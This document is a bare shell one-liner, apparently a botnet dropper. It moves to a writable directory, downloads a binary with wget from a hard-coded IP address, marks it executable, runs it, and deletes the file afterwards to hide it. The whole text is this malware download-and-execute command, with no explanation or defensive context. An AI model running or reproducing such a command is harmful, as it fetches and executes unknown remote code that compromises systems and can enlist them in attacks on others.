cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://119.81.123.214/aaaaajalungka; chmod +x aaaaajalungka; ./aaaaajalungka; rm -rf aaaaajalungka
